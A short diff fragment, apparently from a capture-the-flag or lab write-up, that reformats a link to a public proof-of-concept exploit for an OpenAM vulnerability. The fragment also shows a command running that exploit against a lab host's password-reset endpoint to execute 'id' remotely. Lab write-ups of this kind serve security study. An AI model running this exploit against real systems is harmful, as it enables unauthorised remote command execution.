@@ -43,9 +43,8 @@ Reference: `GHSA-2cqq-rpvq-g5qj`
 
 Exploit used:
 
-```text
 https://github.com/infernosalex/CVE-2026-33439-Python-PoC/blob/main/exploit.py
-```
+
 
 ```bash
 python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'id'
